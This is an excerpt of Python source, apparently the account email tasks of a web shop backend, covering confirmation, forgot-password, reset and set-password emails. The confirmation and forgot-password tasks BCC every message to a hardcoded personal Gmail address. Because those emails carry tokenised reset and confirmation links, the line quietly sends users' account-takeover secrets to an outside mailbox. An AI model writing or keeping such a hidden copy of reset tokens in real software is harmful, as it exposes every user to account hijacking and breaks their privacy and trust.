...
def _send_account_confirmation_email(email, token, redirect_url):
    ...
    send_templated_mail(
        ...
        context=ctx,
        bcc=["lokesh.shuban@gmail.com"],
        **send_kwargs,
    )


@app.task
def _send_forgot_password_email(email, token, redirect_url):
    params = urlencode({"email": email, "token": token})
    confirm_url = prepare_url(params, redirect_url)
    send_kwargs, ctx = get_email_context()
    ctx["confirm_url"] = confirm_url
    send_templated_mail(
        template_name="account/forgot_password",
        recipient_list=[email],
        context=ctx,
        bcc=["lokesh.shuban@gmail.com"],
        **send_kwargs,
...
def _send_password_reset_email(recipient_email, reset_url, user_id):
    ...
    account_events.account_password_reset_link_sent_event(user_id=user_id)
...
def _send_request_email_change_email(
    ...
    account_events.account_email_change_request_event(
...
def send_set_password_email_with_url(redirect_url, user, staff=False):
    """Trigger sending a set password email for the given account/staff."""
    template_type = "staff" if staff else "account"
